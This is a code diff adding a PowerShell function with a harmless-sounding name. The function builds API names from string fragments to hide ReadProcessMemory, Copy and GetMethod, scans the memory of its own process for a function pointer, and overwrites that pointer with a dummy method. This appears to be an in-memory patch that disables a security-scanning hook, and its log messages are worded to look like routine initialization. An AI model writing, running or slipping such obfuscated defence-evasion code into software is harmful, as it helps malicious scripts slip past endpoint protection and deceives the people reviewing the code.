@@ -1,0 +1,34 @@
+function Set-InternalState {
+    [CmdletBinding()]
+    Param()
+
+    $rpm = "Re" + "adPr" + "ocess" + "Memory"
+    $m_cp = "Co" + "py"
+    $m_gm = "Get" + "Met" + "hod"
+
+    :RaidLoop for ($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset) {
+        [IntPtr] $v_ptr = [Int64] $MethodPointer - $j
+        $v_buf = [byte[]]::new($ReadBytes)
+
+        $status = [APIs]::$rpm($Handle, $v_ptr, $v_buf, $ReadBytes, [ref]$dummy)
+
+        for ($i = 0; $i -le ($v_buf.Length - 8); $i++) {
+            $slice = [byte[]]($v_buf[$i..($i+7)])
+            [IntPtr] $v_comp = [bitconverter]::ToInt64($slice, 0)
+
+            if ($v_comp -eq $funcAddr) {
+                Write-Verbose "Sync target identified."
+                [IntPtr] $v_patch = [Int64] $v_ptr + $i
+                break RaidLoop
+            }
+        }
+    }
+
+    $v_dummy = [APIs].$m_gm('Du' + 'mmy').MethodHandle.GetFunctionPointer()
+    $v_payload = [IntPtr[]] ($v_dummy)
+
+    [System.Runtime.InteropServices.Marshal]::$m_cp($v_payload, 0, $v_patch, 1)
+
+    $TimeElapsed = ((Get-Date) - $InitialDate).TotalSeconds
+    Write-Output "Initialization complete: $TimeElapsed s"
+}
